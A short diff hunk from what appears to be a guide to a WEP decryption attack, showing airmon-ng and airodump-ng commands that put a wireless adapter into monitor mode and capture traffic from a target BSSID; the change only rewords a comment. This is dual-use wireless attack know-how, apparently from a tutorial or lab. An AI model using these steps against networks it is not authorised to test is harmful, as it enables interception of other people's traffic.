@@ -13,7 +13,7 @@ This attack, when successful, can decrypt a WEP data packet without knowing the 
 # Set interface to monitor mode
 sudo airmon-ng start $ADAPTER $CHANNEL
 
-# Start monitoring - make terminal large enough to see everything
+# Start monitoring to collect data
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE
 
 # [Terminal Two]
